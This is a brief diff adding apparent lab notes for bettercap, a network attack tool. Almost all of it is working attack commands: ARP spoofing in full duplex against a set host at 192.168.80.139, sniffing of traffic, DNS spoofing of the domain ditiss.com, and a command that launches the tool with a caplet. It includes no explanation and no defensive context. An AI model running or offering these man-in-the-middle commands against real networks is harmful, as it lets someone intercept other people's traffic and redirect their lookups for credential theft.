@@ -1,0 +1,21 @@
+bettercap arp spoofing
+
+
+sudo apt install ca-certificates libnetfilter-queue-dev libpcap-dev unzip wget
+
+
+net.probe on
+
+set arp.spoof.fullduplex true
+set arp.spoof targets 192.168.80.139
+arp.spoof on
+
+set net.sniff.local true
+net.sniff on
+
+set dns.spoof.all true
+set dns.spoof.domains ditiss.com
+dns.spoof on
+
+
+sudo ./bettercap -iface ens33 -caplet spoof.cap
